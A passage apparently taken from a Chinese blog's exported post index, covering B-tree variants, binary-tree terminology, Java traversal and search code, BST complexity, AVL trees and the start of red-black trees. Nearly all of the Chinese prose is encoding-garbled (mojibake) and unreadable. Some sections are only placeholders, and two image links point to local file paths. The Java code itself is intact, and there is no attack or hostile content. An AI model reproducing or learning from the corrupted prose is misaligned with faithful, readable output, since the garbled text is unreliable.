æŸ¥æ‰¾è¿‡ç¨‹ä¸­ï¼ŒB-treeåœ¨æ‰¾åˆ°å…·ä½“çš„æ•°å€¼ä»¥åå°±ç»“æŸï¼ŒB<sup>+</sup>-treeåˆ™éœ€è¦é€šè¿‡ç´¢å¼•æ‰¾åˆ°å¶å­ç»“ç‚¹ä¸­çš„æ•°æ®æ‰ç»“æŸ\n- B-treeä¸­ä»»ä½•ä¸€ä¸ªå…³é”®å­—å‡ºç°ä¸”åªå‡ºç°åœ¨ä¸€ä¸ªç»“ç‚¹ä¸­ï¼ŒB<sup>+</sup>-treeå¯ä»¥å‡ºç°å¤šæ¬¡ã€‚\n\n### B<sup>+</sup>-treeä¼˜ç‚¹\n\n1. **I/Oæ¬¡æ•°æ›´å°‘**ï¼šB<sup>+</sup>-tree çš„å†…éƒ¨ç»“ç‚¹æ²¡æœ‰å­˜å‚¨å…³é”®å­—ï¼Œæ‰€ä»¥åŒæ ·å¤§å°çš„ç£ç›˜é¡µèƒ½å®¹çº³æ›´å¤šç»“ç‚¹ã€‚ä¸€æ¬¡æ€§è¯»å…¥å†…å­˜ä¸­çš„ä¹Ÿå°±è¶Šå¤šï¼Œç›¸å¯¹æ¥è¯´IOè¯»å†™æ¬¡æ•°ä¹Ÿå°±é™ä½äº†\n2. **æŸ¥è¯¢é€Ÿåº¦æ›´ç¨³å®š**ï¼šB<sup>+</sup>-tree æ‰€æœ‰å…³é”®å­—æ•°æ®åœ°å€éƒ½å­˜åœ¨**å¶å­ç»“ç‚¹**ä¸Šï¼Œæ‰€ä»¥æ¯æ¬¡æŸ¥æ‰¾çš„æ¬¡æ•°éƒ½ç›¸åŒæ‰€ä»¥æŸ¥è¯¢é€Ÿåº¦è¦æ¯”Bæ ‘æ›´ç¨³å®š;\n3. **èŒƒå›´æŸ¥è¯¢æ›´ç®€ä¾¿**ï¼šB<sup>+</sup>-tree æ‰€æœ‰çš„å¶å­èŠ‚ç‚¹æ•°æ®æ„æˆäº†ä¸€ä¸ªæœ‰åºé“¾è¡¨ï¼Œåœ¨æŸ¥è¯¢å¤§å°åŒºé—´çš„æ•°æ®æ—¶å€™æ›´æ–¹ä¾¿ï¼Œæ•°æ®ç´§å¯†æ€§å¾ˆé«˜ï¼Œç¼“å­˜çš„å‘½ä¸­ç‡ä¹Ÿä¼šæ¯”Bæ ‘é«˜ã€‚\n4. **å…¨ç»“ç‚¹éå†æ›´å¿«ï¼š**B<sup>+</sup>-tree éå†æ•´æ£µæ ‘åªéœ€è¦éå†æ‰€æœ‰çš„å¶å­èŠ‚ç‚¹å³å¯ï¼Œ B-tree éœ€è¦å¯¹æ¯ä¸€å±‚è¿›è¡Œéå†ï¼Œè¿™æœ‰åˆ©äºæ•°æ®åº“åšå…¨è¡¨æ‰«æã€‚\n\n### ä¸ºä»€ä¹ˆ MySQL çš„ç´¢å¼•è¦ä½¿ç”¨ B+æ ‘è€Œä¸æ˜¯Bæ ‘ï¼Ÿ\n\n**å› ä¸º B æ ‘ä¸ç®¡å¶å­èŠ‚ç‚¹è¿˜æ˜¯éå¶å­èŠ‚ç‚¹ï¼Œéƒ½ä¼šä¿å­˜æ•°æ®**ï¼Œè¿™æ ·å¯¼è‡´åœ¨éå¶å­èŠ‚ç‚¹ä¸­èƒ½ä¿å­˜çš„æŒ‡é’ˆæ•°é‡å˜å°‘ï¼ŒæŒ‡é’ˆå°‘çš„æƒ…å†µä¸‹è¦ä¿å­˜å¤§é‡æ•°æ®ï¼Œåªèƒ½å¢åŠ æ ‘çš„é«˜åº¦ï¼Œå¯¼è‡´ IO æ“ä½œå˜å¤šï¼ŒæŸ¥è¯¢æ€§èƒ½å˜ä½ã€‚\n\n\n\n- [é«˜æ€§èƒ½ GPU å¹¶å‘ B+ æ ‘](https://dl.acm.org/doi/10.1145/3503221.3508419)ã€CCF Aã€‘\n\n- [è®¾è®¡é«˜æ€§èƒ½ GPU B æ ‘](https://dl.acm.org/doi/10.1145/3293883.3295706)ã€CCF Aã€‘\n\n## B<sup>*</sup>-tree\n\nB<sup>\\*</sup>-tree æ˜¯ B<sup>+</sup>-tree çš„å˜ä½“ï¼Œå®ƒæ˜¯åœ¨ B<sup>+</sup>-tree çš„åŸºç¡€ä¸Šï¼Œå°†ç´¢å¼•å±‚ä¹Ÿä»¥æŒ‡é’ˆè¿æ¥èµ·æ¥ï¼Œä½¿æœç´¢å–å€¼æ›´åŠ å¿«æ·ã€‚\n\nä¸B<sup>+</sup>-tree\n\n- é¦–å…ˆæ˜¯å…³é”®å­—ä¸ªæ•°é™åˆ¶é—®é¢˜\n  - B<sup>+</sup>-tree åˆå§‹åŒ–ä¸ªæ•°æ˜¯â¡m/2â¤â‰¤ k â‰¤ m\n  - B<sup>\\*</sup>-tree åˆå§‹åŒ–ä¸ªæ•°ä¸ºâ¡2m/3â¤â‰¤ k â‰¤ m\n\n- B<sup>+</sup>-tree ç»“ç‚¹æ»¡æ—¶å°±ä¼šåˆ†è£‚ï¼ŒB<sup>\\*</sup>-tree ç»“ç‚¹æ»¡æ—¶ä¼šæ£€æŸ¥å…„å¼ŸèŠ‚ç‚¹æ˜¯å¦æ»¡ï¼ˆå› ä¸ºæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰æŒ‡å‘å…„å¼Ÿçš„æŒ‡é’ˆï¼‰\n  - å¦‚æœå…„å¼Ÿç»“ç‚¹æœªæ»¡åˆ™å‘å…„å¼ŸèŠ‚ç‚¹è½¬ç§»å…³é”®å­—\n  - å¦‚æœå…„å¼ŸèŠ‚ç‚¹å·²æ»¡ï¼Œåˆ™ä»å½“å‰èŠ‚ç‚¹å’Œå…„å¼ŸèŠ‚ç‚¹å„æ‹¿å‡º 1/3 çš„æ•°æ®åˆ›å»ºä¸€ä¸ªæ–°çš„èŠ‚ç‚¹å‡ºæ¥\n\n| B<sup>+</sup>-tree                     | B<sup>\\*</sup>-tree                    |\n| -------------------------------------- | -------------------------------------- |\n| ![](https://img.jwt1399.top/img/1.jpg) | ![](https://img.jwt1399.top/img/2.jpg) |\n\n### å¯¹æ¯”\n\n- B<sup>+</sup>-treeï¼šåœ¨ B-tree åŸºç¡€ä¸Šï¼Œä¸º**å¶å­ç»“ç‚¹**å¢åŠ é“¾è¡¨æŒ‡é’ˆï¼Œæ‰€æœ‰å…³é”®å­—éƒ½åœ¨å¶å­ç»“ç‚¹ä¸­å‡ºç°ï¼Œéå¶å­ç»“ç‚¹ä½œä¸ºå¶å­ç»“ç‚¹çš„ç´¢å¼•ï¼›B+æ ‘æ€»æ˜¯åˆ°å¶å­ç»“ç‚¹æ‰å‘½ä¸­\n\n- B<sup>*</sup>-treeï¼šåœ¨ B<sup>+</sup>-tree åŸºç¡€ä¸Šï¼Œä¸º**éå¶å­ç»“ç‚¹**ä¹Ÿå¢åŠ é“¾è¡¨æŒ‡é’ˆï¼Œå°†ç»“ç‚¹çš„ç©ºé—´åˆ©ç”¨ç‡ä»1/2æé«˜åˆ°2/3ï¼ŒæŸ¥è¯¢é€Ÿç‡ä¹Ÿæœ‰æ‰€æé«˜ã€‚åˆå­˜æœ‰å…„å¼ŸèŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œå¯ä»¥å‘å…„å¼ŸèŠ‚ç‚¹è½¬ç§»å…³é”®å­—çš„ç‰¹æ€§ä½¿å¾— B<sup>\\*</sup>-tree åˆ†è§£æ¬¡æ•°å˜å¾—æ›´å°‘ï¼›\n\n## B<sup>ed</sup>-tree\n\n**è®ºæ–‡åç§°ï¼šã€ŠB<sup>ed</sup>-tree: an all-purpose index structure for string similarity search based on edit distanceã€‹**\n\n- ä½œè€…ï¼šZhenjie Zhang, Marios Hadjieleftheriou, Beng Chin Ooi, Divesh Srivastava\n- å•ä½ï¼šæ–°åŠ å¡å›½ç«‹å¤§å­¦ã€AT&T Labs\n- ä¼šè®®ï¼š[SIGMOD '10](https://dl.acm.org/doi/abs/10.1145/1807167.1807266)ã€CCF Aã€‘\n\n- æ—¶é—´ï¼š2010å¹´06æœˆ\n\næœ¬æ–‡ä¸­æå‡º **B<sup>ed</sup>-tree**ï¼Œä¸€ç§**åŸºäº B-tree** çš„ç´¢å¼•ç»“æ„ï¼Œç”¨äº**è¯„ä¼°ç¼–è¾‘è·ç¦»**å’Œæ ‡å‡†åŒ–ç¼–è¾‘è·ç¦»çš„**ç›¸ä¼¼åº¦æŸ¥è¯¢**ã€‚æˆ‘ä»¬ç¡®å®šä»å­—ç¬¦ä¸²ç©ºé—´åˆ°æ•´æ•°ç©ºé—´çš„æ˜ å°„çš„å¿…è¦å±æ€§ï¼Œä»¥æ”¯æŒæœç´¢å’Œä¿®å‰ªè¿™äº›æŸ¥è¯¢ã€‚æå‡ºäº†ä¸‰ç§è½¬æ¢ç”¨äºæ•è·å­—ç¬¦ä¸²ä¸­å›ºæœ‰ä¿¡æ¯çš„ä¸åŒæ–¹é¢ï¼Œä»è€Œåœ¨æ ‘ä¸Šçš„æœç´¢è¿‡ç¨‹ä¸­å®ç°é«˜æ•ˆçš„å‰ªæã€‚ä¸æœ€å…ˆè¿›çš„å­—ç¬¦ä¸²ç›¸ä¼¼æ€§æœç´¢æ–¹æ³•ç›¸æ¯”ï¼Œ B<sup>ed</sup>-tree æ˜¯ä¸€ä¸ªå®Œæ•´çš„è§£å†³æ–¹æ¡ˆï¼Œæ»¡è¶³æ‰€æœ‰åº”ç”¨ç¨‹åºçš„è¦æ±‚ï¼Œæä¾›é«˜å¯æ‰©å±•æ€§å’Œå¿«é€Ÿå“åº”æ—¶é—´ã€‚\n\n## å‚è€ƒ\n\n- [Bæ ‘ - æ•°æ®ç»“æ„æ•™ç¨‹â„¢ (yiibai.com)](https://www.yiibai.com/data_structure/b-tree.html)\n\n- [æ¼«ç”»ï¼šä»€ä¹ˆæ˜¯B-æ ‘ï¼Ÿ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/54084335)\n\n- [ç»ˆäºæœ‰ç¯‡çœ‹çš„æ‡‚çš„Bæ ‘æ–‡ç« äº†ï¼](https://mp.weixin.qq.com/s/MolVZjVAIXRj48_SreN4MA)\n\n- [æ¢ä¸€ä¸ªè§’åº¦çœ‹ B+ æ ‘](https://mp.weixin.qq.com/s/A5gNVXMNE-iIlY3oofXtLw)\n\n- [ç´¢å¼•ä¸ºä»€ä¹ˆèƒ½æé«˜æŸ¥è¯¢æ€§èƒ½](https://mp.weixin.qq.com/s?__biz=MzUxODAzNDg4NQ==&mid=2247486903&idx=1&sn=1c6ca6817baa255265fc25dd69551179&scene=21#wechat_redirect)\n\n- [MYSQLç´¢å¼•æ•°æ®ç»“æ„ä¸ºä»€ä¹ˆä½¿ç”¨B+æ ‘ï¼Ÿ](https://www.cnblogs.com/SweetCode/p/15233526.html)\n\n- [æ•°æ®ç»“æ„ä¹‹Bæ ‘æŸ¥æ‰¾ã€æ’å…¥ã€åˆ é™¤è¯¦è§£](https://weishihuai.blog.csdn.net/article/details/109389544)\n\n- [ æ•°æ®ç»“æ„ä¹‹B+æ ‘æ’å…¥è¯¦è§£](https://blog.csdn.net/Weixiaohuai/article/details/109493541)\n\n- [(9æ¡æ¶ˆæ¯) ä»Bæ ‘ã€B+æ ‘ã€B*æ ‘è°ˆåˆ°R æ ‘](https://blog.csdn.net/v_JULY_v/article/details/6530142/)\n\n  \n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["æ•°æ®ç»“æ„"],"categories":["ç»“æ„-ç®—æ³•"]},{"title":"æ•°æ®ç»“æ„ï¼šäºŒå‰æ ‘","url":"/posts/19968.html","content":"\n## æ ‘çš„è¯ç”Ÿ\n\n1ã€**æ•°ç»„å­˜å‚¨æ–¹å¼çš„åˆ†æ**\n\n- æ•°ç»„æœªæ’åº \n\n  - ä¼˜ç‚¹ï¼šåœ¨æ•°ç»„å°¾æ·»åŠ å…ƒç´ ï¼Œé€Ÿåº¦å¿«\n\n  - ç¼ºç‚¹ï¼šæŸ¥æ‰¾é€Ÿåº¦æ…¢\n\n- æ•°ç»„æ’åº\n  - ä¼˜ç‚¹ï¼šå¯ä»¥ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾ï¼ŒæŸ¥æ‰¾é€Ÿåº¦å¿«\n  - ç¼ºç‚¹ï¼šä¸ºäº†ä¿è¯æ•°ç»„æœ‰åºï¼Œåœ¨æ·»åŠ æ–°æ•°æ®æ—¶ï¼Œæ‰¾åˆ°æ’å…¥ä½ç½®åï¼Œåé¢çš„æ•°æ®éœ€æ•´ä½“ç§»åŠ¨ï¼Œé€Ÿåº¦æ…¢ã€‚\n\n2ã€**é“¾å¼å­˜å‚¨æ–¹å¼çš„åˆ†æ**\n\n- ä¼˜ç‚¹ï¼šåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯¹æ•°ç»„å­˜å‚¨æ–¹å¼æœ‰ä¼˜åŒ–ï¼Œå¢åŠ å’Œåˆ é™¤å…ƒç´ é€Ÿåº¦å¿«\n- ç¼ºç‚¹ï¼šä¸ç®¡é“¾è¡¨æ˜¯å¦æœ‰åºï¼ŒæŸ¥æ‰¾é€Ÿåº¦éƒ½æ…¢(æ£€ç´¢æŸä¸ªå€¼ï¼Œéœ€è¦ä»å¤´èŠ‚ç‚¹å¼€å§‹éå†) \n\n3ã€**æ ‘å­˜å‚¨æ–¹å¼çš„åˆ†æ**\n\nèƒ½æé«˜æ•°æ®å­˜å‚¨ï¼Œè¯»å–çš„æ•ˆç‡ã€‚æ¯”å¦‚åˆ©ç”¨äºŒå‰æ’åºæ ‘ï¼Œæ—¢å¯ä»¥ä¿è¯æ•°æ®çš„æ£€ç´¢é€Ÿåº¦ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä¿è¯æ•°æ®çš„æ’å…¥ï¼Œåˆ é™¤ï¼Œä¿®æ”¹çš„é€Ÿåº¦ã€‚\n\n## æ ‘ä¸­çš„æœ¯è¯­\n\n- ç»“ç‚¹ï¼šæŒ‡æ ‘ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œä¸€èˆ¬ç”¨ n è¡¨ç¤º\n\n- ç»“ç‚¹çš„åº¦ï¼šæŒ‡ç»“ç‚¹æ‹¥æœ‰çš„å­ç»“ç‚¹çš„ä¸ªæ•°ï¼ŒäºŒå‰æ ‘çš„åº¦ä¸å¤§äº2\n\n- æ ‘çš„åº¦ï¼šæŒ‡æ ‘ä¸­å„ç»“ç‚¹çš„åº¦çš„æœ€å¤§å€¼\n- æ ‘çš„é˜¶ï¼šæŒ‡æ ‘ä¸­çš„ä¸€ä¸ªç»“ç‚¹æœ€å¤šèƒ½æœ‰å¤šå°‘ä¸ªå­èŠ‚ç‚¹ï¼Œä¸€èˆ¬ç”¨å­—æ¯ M è¡¨ç¤ºé˜¶æ•°\n- åˆ†æ”¯ç»“ç‚¹ï¼šåº¦å¤§äº0çš„ç»“ç‚¹ï¼Œé™¤äº†å¶å­ç»“ç‚¹ä¹‹å¤–çš„ç»“ç‚¹\n\n- å¶ç»“ç‚¹ï¼šåº¦ä¸º 0 çš„ç»“ç‚¹ï¼Œä¹Ÿç§°ä¸ºç»ˆç«¯ç»“ç‚¹\n\n- é«˜åº¦ï¼šä»ä¸‹åˆ°ä¸Š\n  - æŒ‡ä»å¶å­èŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹çš„æœ€é•¿ç®€å•è·¯å¾„è¾¹çš„æ¡æ•°æˆ–è€…èŠ‚ç‚¹æ•°\n\n  - å¶å­èŠ‚ç‚¹çš„é«˜åº¦ä¸º1ï¼Œæ ¹èŠ‚ç‚¹é«˜åº¦æœ€é«˜\n\n- æ·±åº¦ï¼šä»ä¸Šåˆ°ä¸‹\n  - æŒ‡ä»æ ¹èŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹çš„æœ€é•¿ç®€å•è·¯å¾„è¾¹çš„æ¡æ•°æˆ–è€…èŠ‚ç‚¹æ•°\n\n  - **æ ¹èŠ‚ç‚¹çš„é«˜åº¦å°±æ˜¯äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦**\n\n- å±‚ï¼šè§„å®šæ ¹èŠ‚ç‚¹åœ¨1å±‚ï¼Œå…¶ä»–ä»»æ„èŠ‚ç‚¹æ˜¯å…¶çˆ¶èŠ‚ç‚¹çš„å±‚æ•°+1\n- æ£®æ—ï¼šå½¼æ­¤ä¸ç›¸äº¤çš„æ ‘çš„é›†åˆ\n\n\n\n## äºŒå‰æ ‘\n\n### ç®€ä»‹\n\n- äºŒå‰æ ‘ï¼šæ¯ä¸ªç»“ç‚¹æœ€å¤šåªèƒ½æœ‰ä¸¤ä¸ªå­ç»“ç‚¹(å·¦ç»“ç‚¹å’Œå³ç»“ç‚¹)\n- æ»¡äºŒå‰æ ‘ï¼šäºŒå‰æ ‘çš„æ‰€æœ‰å¶å­ç»“ç‚¹éƒ½åœ¨æœ€åä¸€å±‚ï¼Œä¸”ç»“ç‚¹æ€»æ•°ä¸º 2<sup>n</sup> -1 , n ä¸ºå±‚æ•°\n- å®Œå…¨äºŒå‰æ ‘ï¼šäºŒå‰æ ‘çš„æ‰€æœ‰å¶å­ç»“ç‚¹éƒ½åœ¨æœ€åä¸€å±‚æˆ–è€…å€’æ•°ç¬¬äºŒå±‚ï¼Œè€Œä¸”æœ€åä¸€å±‚çš„å¶å­ç»“ç‚¹åœ¨å·¦è¾¹è¿ç»­ï¼Œå€’æ•°ç¬¬äºŒå±‚çš„å¶å­ç»“ç‚¹åœ¨å³è¾¹è¿ç»­\n- å·¦æ–œæ ‘ï¼šæ‰€æœ‰èŠ‚ç‚¹éƒ½åªæœ‰å·¦å­æ ‘çš„äºŒå‰æ ‘\n- å³æ–œæ ‘ï¼šæ‰€æœ‰èŠ‚ç‚¹éƒ½åªæœ‰å³å­æ ‘çš„äºŒå‰æ ‘\n\n### å‰åºéå†\n\n> å…ˆè¾“å‡ºçˆ¶èŠ‚ç‚¹ï¼Œå†éå†å·¦å­æ ‘å’Œå³å­æ ‘\n\n#### é€’å½’\n\n```java\npublic void preOrderRecur(Node root) {\n\t\tif (root == null) {\n\t\t\treturn;\n\t\t}\n\t\tSystem.out.print(root.data + \" -> \");\n\t\tpreOrderRecur(root.left);\n\t\tpreOrderRecur(root.right);\n\t}\n```\n\n#### éé€’å½’\n\n```java\npublic void preOrder() {\n\t\tif (root == null)\n\t\t\treturn;\n\t\tNode current;\n\t\t//æŠŠLinkedListå½“æ ˆä½¿ç”¨\n\t\tLinkedList<Node> s = new LinkedList<Node>();\n\t\ts.addFirst(root);\n\t\twhile (!s.isEmpty()) {\n\t\t\tcurrent = s.removeFirst();\n\t\t\tSystem.out.print(current.data + \" -> \");\n\t\t\tif (current.right != null)\n\t\t\t\ts.addFirst(current.right);\n\t\t\tif (current.left != null)\n\t\t\t\ts.addFirst(current.left);\n\t\t}\n\n\t}\n```\n\n### ä¸­åºéå†\n\n> å…ˆéå†å·¦å­æ ‘ï¼Œ**å†è¾“å‡ºçˆ¶èŠ‚ç‚¹**ï¼Œå†éå†å³å­æ ‘\n\n#### é€’å½’\n\n```java\npublic void inOrderRecur(Node root) {\n\t\tif (root == null) {\n\t\t\treturn;\n\t\t}\n\t\tinOrderRecur(root.left);\n\t\tSystem.out.print(root.data + \" -> \");\n\t\tinOrderRecur(root.right);\n\t}\n\n```\n\n#### éé€’å½’\n\n```java\npublic void inOrder() {\n\t\tNode current = root;\n\t\t//æŠŠLinkedListä½œä¸ºæ ˆä½¿ç”¨\n\t\tLinkedList<Node> s = new LinkedList<Node>();\n\t\twhile (current != null || !s.isEmpty()) {\n\t\t\twhile (current != null) {\n\t\t\t\ts.addFirst(current);\n\t\t\t\tcurrent = current.left;\n\t\t\t}\n\t\t\tif (!s.isEmpty()) {\n\t\t\t\tcurrent = s.removeFirst();\n\t\t\t\tSystem.out.print(current.data + \" -> \");\n\t\t\t\tcurrent = current.right;\n\t\t\t}\n\t\t}\n\t}\n```\n\nå‚è€ƒï¼š[äºŒå‰æ ‘ä¸­åºéå†ï¼ˆé€’å½’+éé€’å½’ï¼‰](https://blog.csdn.net/dabusiGin/article/details/102723054)\n\n### ååºéå†\n\n> å…ˆéå†å·¦å­æ ‘ï¼Œå†éå†å³å­æ ‘ï¼Œ**æœ€åè¾“å‡ºçˆ¶èŠ‚ç‚¹**\n\n#### é€’å½’\n\n```java\npublic void postOrderRecur(Node root) {\n\t\tif (root == null) {\n\t\t\treturn;\n\t\t}\n\t\tpostOrderRecur(root.left);\n\t\tpostOrderRecur(root.right);\n\t\tSystem.out.print(root.data + \" -> \");\n\t}\n```\n\n#### éé€’å½’\n\n```java\npublic void postOrder() {\n\t\tNode current = root;\n\t\tLinkedList<Node> s1 = new LinkedList<Node>();\n\t\tLinkedList<Node> s2 = new LinkedList<Node>();\n\t\twhile (current != null || !s1.isEmpty()) {\n\t\t\twhile (current != null) {\n\t\t\t\ts1.addFirst(current);\n\t\t\t\ts2.addFirst(current);\n\t\t\t\tcurrent = current.right;\n\t\t\t}\n\t\t\tif (!s1.isEmpty()) {\n\t\t\t\tcurrent = s1.removeFirst();\n\t\t\t\tcurrent = current.left;\n\t\t\t}\n\t\t}\n\t\twhile (!s2.isEmpty()) {\n\t\t\tSystem.out.print(s2.removeFirst().data + \" -> \");\n\t\t}\n\t}\n```\n\n### å±‚æ¬¡éå†\n\n```java\nvoid bfs(TreeNode root) {\n    Queue<TreeNode> queue = new ArrayDeque<>();\n    queue.add(root);\n    while (!queue.isEmpty()) {\n        TreeNode node = queue.poll();\n        if (node.left != null) {\n            queue.add(node.left);\n        }\n        if (node.right != null) {\n            queue.add(node.right);\n        }\n    }\n}\n```\n\n\n\n### æŸ¥æ‰¾\n\n```java\npublic boolean contains(int e) {\n\t\t//ç”¨currentè®°å½•æ ¹èŠ‚ç‚¹\n\t\tNode current = root;\n\t\twhile (current != null) {\n\t\t\t//ç›¸ç­‰ï¼Œè¯´æ˜æ‰¾åˆ°äº†ï¼Œè¿”å›true\n\t\t\tif (e == current.data) {\n\t\t\t\treturn true;\n\t\t\t\t//è¦æŸ¥æ‰¾çš„æ•°æ¯”æ ¹èŠ‚ç‚¹å¤§ï¼ŒæŒ‡å‘æ ¹èŠ‚ç‚¹çš„å³å„¿å­\n\t\t\t} else if (e > current.data) {\n\t\t\t\tcurrent = current.right;\n\t\t\t\t//è¦æŸ¥æ‰¾çš„æ•°æ¯”æ ¹èŠ‚ç‚¹ä¸‹ï¼ŒæŒ‡å‘æ ¹èŠ‚ç‚¹çš„å·¦å„¿å­\n\t\t\t} else {\n\t\t\t\tcurrent = current.left;\n\t\t\t}\n\t\t}\n\t\t//æ‰¾ä¸åˆ°ï¼Œè¿”å›false\n\t\treturn false;\n\t}\n```\n\n\n\n### åˆ é™¤\n\n**ä»£ç å®ç°**\n\n```\n\n```\n\n## é¡ºåºå­˜å‚¨äºŒå‰æ ‘\n\nã€‚ã€‚ã€‚\n\n## çº¿ç´¢åŒ–äºŒå‰æ ‘\n\nã€‚ã€‚ã€‚\n\n## äºŒå‰æœç´¢æ ‘-BST\n\näºŒå‰æœç´¢æ ‘(BST: Binary Search Tree)ï¼šä»»ä½•ä¸€ä¸ªéå¶å­ç»“ç‚¹ï¼Œè¦æ±‚å·¦å­ç»“ç‚¹çš„å€¼æ¯”å½“å‰ç»“ç‚¹çš„å€¼å°ï¼Œå³å­ç»“ç‚¹çš„å€¼æ¯”å½“å‰ç»“ç‚¹çš„å€¼å¤§ã€‚\n\n### åˆ›å»ºå’Œéå†\n\nã€‚ã€‚ã€‚\n\n### åˆ é™¤\n\nã€‚ã€‚ã€‚\n\n### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ï¼šO(log<sub>2</sub>n)ï½O(n)\n\n  - å¦‚æœäºŒå‰æœç´¢æ ‘æ˜¯å¹³è¡¡çš„ï¼Œåˆ™ n ä¸ªèŠ‚ç‚¹çš„äºŒå‰æ’åºæ ‘çš„é«˜åº¦ä¸º log<sub>2</sub>n+1 ï¼Œå…¶æŸ¥æ‰¾æ•ˆç‡ä¸ºO(log<sub>2</sub>n)ï¼Œè¿‘ä¼¼äºæŠ˜åŠæŸ¥æ‰¾ã€‚\n\n  - å¦‚æœäºŒå‰æœç´¢æ ‘å®Œå…¨ä¸å¹³è¡¡ï¼Œåˆ™å…¶æ·±åº¦å¯è¾¾åˆ° nï¼ŒæŸ¥æ‰¾æ•ˆç‡ä¸º O(n)ï¼Œé€€åŒ–ä¸ºé¡ºåºæŸ¥æ‰¾ã€‚\n\n- ç©ºé—´å¤æ‚åº¦ï¼šO(n)\n\n## å¹³è¡¡äºŒå‰æ ‘-AVL\n\n### å¼•å‡º\n\nç»™ä½ ä¸€ä¸ªåºåˆ— {1,2,3,4,5,6}ï¼Œè¦æ±‚åˆ›å»ºä¸€é¢—äºŒå‰æœç´¢æ ‘(BST)\n\n<img src=\"https://img.jwt1399.top/img/image-20220411191625032.png\" style=\"zoom:50%;\" />\n\nå¯ä»¥çœ‹åˆ°å·¦å­æ ‘å…¨éƒ¨ä¸ºç©ºï¼Œæç«¯æƒ…å†µä¸‹ï¼ŒäºŒå‰æ ‘ä¼šé€€åŒ–æˆé“¾è¡¨\n\n- æ’å…¥é€Ÿåº¦æ²¡æœ‰å½±å“\n- æŸ¥è¯¢é€Ÿåº¦æ˜æ˜¾é™ä½(éœ€è¦ä¾æ¬¡æ¯”è¾ƒ)ï¼Œæœç´¢æ•ˆç‡é™ä½ä¸º O(n)\n\nç”±æ­¤ï¼ŒäºŒå‰æœç´¢æ ‘çš„æŸ¥æ‰¾æ•ˆç‡å–å†³äºæ ‘çš„é«˜åº¦ï¼Œå› æ­¤ä¿æŒæ ‘çš„é«˜åº¦æœ€å°ï¼Œå³å¯ä¿è¯æ ‘çš„æŸ¥æ‰¾æ•ˆç‡ã€‚å¦‚ä½•ä¿è¯ï¼Ÿè¿™å°±è¦å¼•å…¥å¹³è¡¡äºŒå‰æ ‘äº†ï¼\n\n### ç®€ä»‹\n\nå¹³è¡¡äºŒå‰æ ‘ï¼Œç”±å‰è‹è”çš„æ•°å­¦å®¶ **A**delse-**V**elskil å’Œ **L**andis åœ¨ 1962 å¹´æå‡ºçš„é«˜åº¦å¹³è¡¡çš„äºŒå‰æ ‘ï¼Œæ ¹æ®ç§‘å­¦å®¶çš„è‹±æ–‡åä¹Ÿç§°ä¸º **AVL æ ‘**ã€‚ å¯ä»¥ä¿è¯æŸ¥è¯¢æ•ˆç‡è¾ƒé«˜ã€‚\n\n**ç‰¹ç‚¹ï¼š**\n\n- å¿…é¡»æ˜¯äºŒå‰æœç´¢æ ‘\n- æ¯ä¸ªç»“ç‚¹çš„å·¦å­æ ‘å’Œå³å­æ ‘çš„é«˜åº¦å·®çš„ç»å¯¹å€¼ä¸è¶…è¿‡1\n\n**å¹³è¡¡å› å­**ï¼šå°†äºŒå‰æ ‘ä¸ŠèŠ‚ç‚¹çš„å·¦å­æ ‘é«˜åº¦å‡å»å³å­æ ‘é«˜åº¦çš„å€¼ç§°ä¸ºè¯¥èŠ‚ç‚¹çš„å¹³è¡¡å› å­BF(Balance Factor)ã€‚\n\n### å·¦æ—‹è½¬\n\n![](/Users/jianjian/jwt1399.github.io/source/images/æ•°æ®ç»“æ„-æ ‘/v2-0a737f5850ac96deec1821c80391a08a_b.jpg)\n\n### å³æ—‹è½¬\n\n![](/Users/jianjian/jwt1399.github.io/source/images/æ•°æ®ç»“æ„-æ ‘/v2-eee97a3e3e45d8cb6668841f6b44191a_b.jpg)\n\n### åŒæ—‹è½¬\n\nã€‚ã€‚ã€‚\n\n## çº¢é»‘æ ‘\n\nçº¢é»‘æ ‘æ˜¯ AVL æ ‘çš„å˜ä½“\n\n- ç»“ç‚¹ä¸æ˜¯çº¢è‰²å°±æ˜¯é»‘è‰²ï¼Œæ ¹ç»“ç‚¹å¿…æ˜¯é»‘è‰²\n- å¶å­ç»“ç‚¹æ˜¯ null ç»“ç‚¹ï¼ˆç©ºç»“ç‚¹ï¼‰ä¸”ä¸ºé»‘è‰²\n\n- æ¯ä¸ªçº¢è‰²ç»“ç‚¹çš„ä¸¤ä¸ªå­ç»“ç‚¹éƒ½æ˜¯é»‘è‰²ã€‚ï¼ˆåŒä¸€è·¯å¾„ï¼Œä¸å­˜åœ¨è¿ç»­çš„çº¢è‰²èŠ‚ç‚¹ï¼‰\n- 